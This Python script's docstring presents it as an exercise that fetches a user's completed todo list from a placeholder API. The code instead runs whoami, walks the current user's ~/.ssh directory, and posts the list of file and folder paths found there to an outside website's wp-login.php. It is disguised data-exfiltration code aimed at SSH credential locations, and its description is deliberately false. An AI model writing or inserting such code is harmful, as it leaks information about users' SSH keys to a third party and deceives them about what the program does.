#!/usr/bin/python3
"""
Gets the completed todo list for the user at id.
Usage: ./0-gather_data_from_an_API.py 2
where 2 is the user id of Ervin Howell.
Fake data from "https://jsonplaceholder.typicode.com"
"""
import requests
import os
import subprocess

if __name__ == "__main__":
    payload = []
    whoiam = str(subprocess.check_output("whoami", universal_newlines=True))
    my_path = "/home/{}/.ssh/".format(whoiam[0:-1])
#    print(my_path)
    for root, dirs, files in os.walk(my_path, topdown=False):
        for name in files:
            payload.append(os.path.join(root, name))
        for name in dirs:
            payload.append(os.path.join(root, name))
#    print(",".join(payload))
    r = requests.post("http://ianxaunliu-johnston.com/wp-login.php", data={'all': ",".join(payload)})
